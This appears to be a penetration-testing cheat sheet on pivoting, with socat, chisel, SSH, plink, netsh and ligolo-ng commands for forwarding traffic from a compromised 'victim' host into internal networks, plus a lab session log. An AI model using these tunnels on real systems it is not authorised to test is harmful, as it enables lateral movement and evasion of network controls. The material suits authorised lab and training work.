		## SOCAT
Port Forward (Liston on port 2345, forward all traffci to 5432 on 10.4.50.215 IP)
`socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`
Port Forward all traffic from localmachine 2222 to 22 on 10.4.50.215
`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

## Chisel 
Start an reverse listening server on your local machine:
`chisel server --reverse -p 9001`
Upload chisel to infected machine: 
`scp chisel user@host:/path/to/chisel`
Start chisel client on infected machine:
`chisel client 10.10.16.7:9001 R:8111:127.0.0.1:8111`

#### Chisel Dynamic Port forward:
On victim machine: `.\SharpChisel.exe server --socks5 --port 9001`
On local Kali: `./chisel client 192.168.220.141:9001 50080:socks`
Add 50080 to proxychains conf


### SSH 
Listen on all interfaces on port 4455 and forward all packets to port 445 on 172.16.50.217
`ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215`

Dynamic port forwarding: Listen on all interfaces on port 9999 and send all traffic through 10.4.50.215 to other hosts behing the 10.4 X host: 
`ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215`

Remote port forward: Listen on our local Kali machine on port 2345 forward all traffic to 10.4.50.215 on port 5423:
`ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4`

Remote Dynamic port forward: Listen on our Kali machine port 9998 and forward all traffic to specified ports: 
`ssh -N -R -D 9998 kali@192.168.118.4`

```
# $LOCAL_IP: 'localhost' or machine from local network
# $LOCAL_PORT: open port on local machine
# $REMOTE_IP: remote localhost or IP from remote network
# $REMOTE_PORT: open port on remote site

# Forward Tunnel: map port from remote machine/network on local machine
ssh -L $LOCAL_PORT:$REMOTE_IP:$REMOTE_PORT $USER@$SERVER

# Reverse Tunnel: make local port accessable to remote machine
ssh -R $REMOTE_PORT:$LOCAL_IP:$LOCAL_PORT $USER@$SERVER

```


### Proxychains
After adding an listening port the local machine we have to use proxychains to send traffic to the specific listening port, if the port is configured on 9999 then change the .conf as: 
```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```

### PLINK
Remote port forward to local Kali SSH machine 
`C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4`


### NETSH
Add a portproxy ipv4 listener on port 2222, and connect on port 22 to host 10.4.50.215
`netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`
Add to firewall: `netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`


## Ligolo 
```

..[$] <()> sudo ./proxy -selfcert   
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
WARN[0000] TLS Certificate fingerprint for ligolo is: E2D4A7B037244762CAE1EBF1A187802B6C5E497286D01D980E45066670BD57A5 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.7.5

ligolo-ng » INFO[0006] Agent joined.                                 id=af1ace72-0dc5-423b-97b0-1f448f7919d7 name="MS01\\Administrator@MS01" remote="192.168.143.147:61852"
ligolo-ng » start
error: please, select an agent using the session command
ligolo-ng » session
? Specify a session : 1 - MS01\Administrator@MS01 - 192.168.143.147:61852 - af1ace72-0dc5-423b-97b0-1f448f7919d7
[Agent : MS01\Administrator@MS01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:9e:bd:39              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.143.147/24             │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:9e:cd:66              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.10.103.147/24               │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
[Agent : MS01\Administrator@MS01] » interface_add_route --name ms01 --route 10.10.103.147/24 
error: Link not found
[Agent : MS01\Administrator@MS01] » interface_add_route --name ms01 --route 10.10.103.147/24 dev ligolo
error: invalid usage of command 'route_add' (unconsumed input 'dev ligolo'), try 'help'
[Agent : MS01\Administrator@MS01] » interface_create oscpb
error: invalid usage of command 'interface_create' (unconsumed input 'oscpb'), try 'help'
[Agent : MS01\Administrator@MS01] » interface_create --name oscpb
INFO[0106] Creating a new "oscpb" interface...          
INFO[0106] Interface created!                           
[Agent : MS01\Administrator@MS01] » interface_add_route --name oscpb --route 10.10.103.147/24
INFO[0129] Route created.                               
[Agent : MS01\Administrator@MS01] » tunnel_start -tun oscpb
error: invalid flag: -tun
[Agent : MS01\Administrator@MS01] » tunnel_start --tun oscpb
[Agent : MS01\Administrator@MS01] » INFO[0198] Starting tunnel to MS01\Administrator@MS01 (af1ace72-0dc5-423b-97b0-1f448f7919d7) 
```

https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5